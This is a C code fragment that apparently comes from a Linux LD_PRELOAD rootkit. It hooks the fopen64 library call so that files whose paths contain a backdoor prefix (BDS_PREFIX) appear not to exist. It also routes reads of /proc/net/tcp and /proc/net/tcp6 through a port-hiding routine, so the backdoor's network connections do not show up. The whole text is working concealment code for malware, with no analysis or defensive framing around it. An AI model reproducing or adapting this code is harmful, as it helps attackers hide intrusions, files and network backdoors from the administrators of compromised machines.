FILE *fopen64(const char *pathname, const char *mode) {
	if (!orig_fopen64)
		orig_fopen64 = dlsym(RTLD_NEXT,"fopen64");
	if (debug == 1)
		printf("\nfopen64 : %s\n", pathname);
    
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return NULL;    
	}
    
	if (strcmp (pathname, "/proc/net/tcp") == 0 || strcmp (pathname, "/proc/net/tcp6") == 0) {
		return hide_port(pathname);
	}
    
	return orig_fopen64(pathname, mode);
}